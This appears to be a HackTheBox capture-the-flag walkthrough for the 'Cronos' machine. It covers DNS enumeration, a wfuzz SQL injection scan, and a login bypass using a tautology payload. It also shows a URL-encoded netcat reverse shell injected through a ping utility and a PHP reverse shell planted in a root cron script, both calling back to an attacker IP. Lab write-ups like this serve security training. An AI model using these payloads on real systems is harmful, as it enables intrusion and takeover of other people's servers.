## Initial Exploit - 
***
Lookup subdomains using DNS:  
> dig ANY @10.129.227.211 cronos.htb

![](/home/kali/Walkthroughs/HackTheBox/cronos/images/dig.png)

Add **cronos.htb** and **admin.cronos.htb** to the hosts file:  
![](/home/kali/Walkthroughs/HackTheBox/cronos/images/hosts.png)

Check for SQL injections on the login page at **admin.cronos.htb**:  
> wfuzz --hs "Password is invalid" -u http://admin.cronos.htb/ -d "username=FUZZ&password=password" -H "Cookie: PHPSESSID=iam4a4nr4grmbh46tuksaq83u5" -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt

![](/home/kali/Walkthroughs/HackTheBox/cronos/images/wfuzz.png)

Set up a listener:  
> sudo nc -lvnp 80

Login using the credentials **"admin' or '1'='1'#" : password**. Use the ping utility and send the request to Burp. Modify the payload to add a reverse shell. Add **%26%26rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.16+80+>/tmp/f** after the IP: 
![](/home/kali/Walkthroughs/HackTheBox/cronos/images/rce.png)

Send the request. The shell returns as www-data.

<div style="page-break-after: always;"></div>

## Privilege Escalation - 
***
Root runs the script at **/var/www/laravel/artisan** every minute. Modify the script to add a PHP reverse shell.
![](/home/kali/Walkthroughs/HackTheBox/cronos/images/crontab.png)
```
<?php shell_exec("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.16 80 >/tmp/f"); ?>
```
![](/home/kali/Walkthroughs/HackTheBox/cronos/images/priv.png)

Set up a listener. Wait for the cron job to run:  
> sudo nc -lvnp 80 

<div style="page-break-after: always;"></div>

## Proof - 
***
### User:

![](/home/kali/Walkthroughs/HackTheBox/cronos/images/user.png)

### Root:

![](/home/kali/Walkthroughs/HackTheBox/cronos/images/root.png)